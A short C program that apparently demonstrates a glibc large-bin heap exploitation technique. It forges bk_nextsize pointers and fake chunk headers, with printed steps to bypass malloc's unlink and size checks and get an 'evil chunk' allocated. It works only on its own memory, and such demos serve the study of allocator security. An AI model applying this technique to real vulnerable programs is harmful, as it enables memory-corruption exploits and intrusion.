#include <stdio.h>
#include <string.h>
#include <stdlib.h>

int main()
{
	void *target;
	void *p,*p1,*p2,*p3,*p4,*p5;
	long long* ptr;
	long long var1=0;
	long long var2=0;

	target=malloc(0x200);

	p=malloc(0x1000);

	p1=malloc(0x400);
	malloc(0x20);
	p2=malloc(0x410);
	malloc(0x20);
	p3=malloc(0x420);
	malloc(0x20);

	free(p1);
	free(p2);
	
	printf("alloc a bigger chunk to add previous unsorted bins to large bins.\n");
	malloc(0x500);

	printf("fake the bk_nextside of the first chunk in large bin link.\n");
	ptr=(long long*)p2;
	*(ptr+3)=(long long)p;

	printf("fake the chunk we are going to alloc.\n");
	ptr=(long long*)p;
	*ptr=0;
	*(ptr+1)=0x421;
	*(ptr+2)=(long long)target-0x18;
	*(ptr+3)=(long long)target-0x10;
	*(ptr+4)=(long long)p2-0x10;
	*(ptr+5)=(long long)p+0x80;

	printf("bypass the unlink check.\n");
	ptr=(long long*)target;
	*ptr=(long long)p;

	printf("fake the second chunk, FD to the chunk above.\n");
	ptr=(long long*)p+0x10;
	*ptr=0;
	*(ptr+1)=0x411;
	*(ptr+2)=0;
	*(ptr+3)=0;
	*(ptr+4)=(long long)p;

	printf("bypass the size check\n");
	ptr=(char*)p+0x420;
	*ptr=0x420;
	*(ptr+1)=0x411;
	

	printf("alloc the evil chunk at:%p\n",malloc(0x410));


	return 0;
}
